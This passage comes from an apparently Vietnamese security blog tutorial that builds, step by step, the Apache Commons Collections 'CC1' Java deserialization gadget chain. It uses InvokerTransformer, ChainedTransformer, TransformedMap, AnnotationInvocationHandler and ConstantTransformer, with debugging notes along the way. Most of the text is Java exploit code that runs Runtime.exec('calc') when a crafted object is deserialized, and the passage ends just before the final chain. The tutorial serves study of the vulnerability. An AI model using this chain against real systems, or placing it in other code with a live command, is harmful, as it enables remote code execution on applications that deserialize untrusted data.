class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, cmd);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(), <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihClassConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihClassConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihClassConstructor.newInstance(Override.class, map);<span class="comment">//Tham số đầu của constructor là lớp bất kỳ kế thừa Annotation, và Override.class là một lớp thõa mãn. Các bạn có thể tự tìm hiểu thêm về Annotation.</span></span><br><span class="line">        serialize(aihObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Đến đây vẫn chưa có gì xảy ra bởi vì:</p>
+<ul>
+<li>Đối tượng Runtime chưa được đặt vào hàm setValue. Và ở đây nó được set là object kiểu <code>AnnotationTypeMismatchExceptionProxy</code>, chúng ta không thể kiểm soát được.<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">    <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">        var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>Chúng ta chưa làm thõa mãn hai điều kiện dẫn đến hàm setValue trong AnnotationInvocationHandler.readObject.</li>
+<li>Đối tượng Runtime không thể serialize và cần được chuyển đổi thành dạng có thể serialize thông qua reflection.</li>
+</ul>
+<h3 id="Giai-quyet-van-de-Runtime-khong-the-serialize"><a href="#Giai-quyet-van-de-Runtime-khong-the-serialize" class="headerlink" title="Giải quyết vấn đề Runtime không thể serialize"></a>Giải quyết vấn đề Runtime không thể serialize</h3><p>Runtime không thể serialize nhưng Runtime.class thì có thể.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> runtimeClass.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) method.invoke(<span class="literal">null</span>);<span class="comment">//method getRuntime() không cần tham số</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> runtimeClass.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        exec.invoke(runtime, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Thay vì invoke trực tiếp, chúng ta có thể lợi dụng lớp InvokerTransformer để invoke hàm getRuntime hay invoke method và invoke exec của lớp runtime. Mình sẽ đi từng bước cho các bạn dễ hiểu.<br>Đầu tiên là invoke method <code>getDeclaredMethod</code> để lấy ra method getRuntime.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">//Tương đương với Method getRuntimeMethod = runtimeClass.getDeclaredMethod(&quot;getRuntime&quot;);</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">InvokerGetMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) InvokerGetMethod.transform(Runtime.class);</span><br><span class="line">        <span class="comment">// Tương đương với Method method = runtimeClass.getDeclaredMethod(&quot;getRuntime&quot;);</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) getMethod.invoke(<span class="literal">null</span>);</span><br><span class="line">        runtime.exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Tiếp theo là invoke biến <code>getRuntimeMethod</code> để tạo Runtime object. Rồi thực hiện invoke method exec của object runtime mới tạo ra. </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="comment">//Tương đương với Method getRuntimeMethod = runtimeClass.getDeclaredMethod(&quot;getRuntime&quot;);</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">InvokerGetMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) InvokerGetMethod.transform(Runtime.class);</span><br><span class="line">        <span class="comment">//Tương đương với Runtime runtime = (Runtime) method.invoke(null);</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">InvokerRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) InvokerRuntime.transform(getRuntimeMethod);</span><br><span class="line">        <span class="comment">//Tương đương với exec.invoke(runtime, &quot;calc&quot;);</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">InvokerExec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        InvokerExec.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Để ý ở phần trên chúng ta có các InvokerTransformer nối tiếp nhau, để thuận tiện hơn người ta đã có tạo ra một lớp là ChainedTransformer, nó cũng thực hiện như InvokerTransformer tuy nhiên điểm khác là nó sẽ thực thi theo một chuỗi gắn kết với nhau. Chúng ta sẽ lợi dụng hàm này để thực thi tương tự như trên.</p>
+<h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p><img src="/.io//ChainedTransformed.png" alt="alt"></p>
+<p>Viết tiếp chain theo ChainedTranformer:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(Runtime.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Kết hợp với TransformedMap chúng ta có chuỗi hoàn chỉnh sau:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testTransformedMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihClassConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihClassConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihClassConstructor.newInstance(Override.class, map);</span><br><span class="line">        serialize(aihObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Giai-quyet-van-de-cau-lenh-if"><a href="#Giai-quyet-van-de-cau-lenh-if" class="headerlink" title="Giải quyết vấn đề câu lệnh if"></a>Giải quyết vấn đề câu lệnh if</h3><p>Đến đây chúng ta vẫn chưa giải quyết vấn đề AnnotationInvocationHandler.readObject sử dụng hàm setValue. Đến đây các bạn nên debug để xử lý dễ dàng hơn nhé.</p>
+<p>Đặt breakpoint ở dòng 339 và 341.</p>
+<p><img src="/.io//debug-readObject.png" alt="alt"></p>
+<p>Chúng ta cần var7 là một giá trị không null.</p>
+<ul>
+<li><code>Map var3 = var2.memberTypes()</code>, var2 là một Object kiểu AnnotationType của lớp kế thừa Annotation mà ta truyền vào ở đoạn <code>Object aihObject = aihClassConstructor.newInstance(Override.class, map);</code>. </li>
+<li><code>var2 = AnnotationType.getInstance(this.type)</code>: var2 là một Object kiểu AnnotationType của lớp kế thừa Annotation mà ta truyền vào ở đoạn <code>Object aihObject = aihClassConstructor.newInstance(Override.class, map);</code></li>
+<li>Code gốc khá là khó hiểu nên các bạn cứ hiểu đơn giản là trong AnnotationType có biến là memberTypes là một map với key là tên của biến trong <code>Override.class</code> mình cho vào, và value là kiểu của biến này. Ta gọi <code>var2.memberTypes()</code> sẽ trả về map này.<br>Vậy là lỗi ở đây xảy ra do interface Override không có biến nào cả. Chúng ta cần tìm Annotation khác có biến, ở đây chúng ta có annotation Target có một biến. Và đặt lại giá trị trong map là <code>key=value</code> và <code>value=bất kỳ</code>:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testTransformedMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;testtt&quot;</span>);</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihClassConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihClassConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihClassConstructor.newInstance(Target.class, map);</span><br><span class="line">        serialize(aihObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><img src="/.io//var7-setOk.png" alt="alt"></p>
+<p>Chúng ta đã vượt qua được if đầu tiên, và đồng thời if thứ 2 cũng đã vượt qua (không cần để ý đến vì toàn code gốc, đọc vào sẽ tốn thời gian của chúng ta thui à). Tuy nhiên vẫn chưa đủ để exec calc bởi vì chúng ta chưa xử lý vấn đề không điều khiển được <code>AnnotationTypeMismatchExceptionProxy</code>.</p>
+<h3 id="Giai-quyet-van-de-khong-dieu-khien-duoc-AnnotationTypeMismatchExceptionProxy"><a href="#Giai-quyet-van-de-khong-dieu-khien-duoc-AnnotationTypeMismatchExceptionProxy" class="headerlink" title="Giải quyết vấn đề không điều khiển được AnnotationTypeMismatchExceptionProxy"></a>Giải quyết vấn đề không điều khiển được AnnotationTypeMismatchExceptionProxy</h3><p><img src="/.io//ConstantTransformer.png" alt="alt"></p>
+<p>Đến đây mọi thứ được lập trình ra vẫn hỗ trợ cho chain của chúng ta :), lớp <code>ConstantTransformer</code> tương tự như InvokerTransformer tuy nhiên khi thực hiện transform, thằng <code>ConstantTransformer</code> sẽ trực tiếp return ra Object mình truyền vào ở hàm tạo chứ không phải Object truyền vào ở hàm Transform, Object này sẽ nối tiếp cho chuỗi sau.<br>Vậy là chúng ta có thể thực hiện <code>x.Transform(new AnnotationTypeMismatchExceptionProxy....)</code></p>
+<p>Từ đây chúng ta có chuỗi hoàn chỉnh sau:</p>
